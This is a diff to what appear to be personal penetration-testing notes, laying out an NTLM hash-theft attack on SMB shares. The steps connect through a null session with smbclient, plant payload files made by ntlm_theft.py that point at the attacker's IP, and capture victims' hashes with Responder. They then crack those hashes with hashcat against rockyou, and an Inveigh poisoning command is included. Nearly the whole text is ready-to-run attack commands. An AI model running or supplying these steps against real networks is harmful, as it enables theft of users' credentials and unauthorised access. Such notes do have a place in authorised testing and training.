@@ -20,17 +20,23 @@
 
 #### 1) Connect to SMB ( If you have no credentials, connect via NULL session if it is allowed) smbclient -N \\\\IP_ADDRESS\\
 
-#### 2) Check if you have write access on the share you are connected to.
+#### 2) Check if you have write access to the share you are connected to.
 
-#### 3) python3 ntlm_theft.py -g all -s OUR_IP -f FOLDER_NAME (Create the malicious payload)
+#### 3) Create the malicious payload
 
-#### 4) sudo responder -I INTERFACE
+    python3 ntlm_theft.py -g all -s OUR_IP -f FOLDER_NAME 
+
+#### 4) Activate Responder
+
+    sudo responder -I INTERFACE
 
 #### 5) Upload an .lnk file to the writeable share
 
 #### 6) After a few minutes you should have captured the hash of the user that tried to interact with our file
 
 #### 7) Crack with hashcat
+
+    hashcat -m 5600 HASHFILE /usr/share/wordlists/rockyou.txt
 
 ### .\inveighzero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6
 
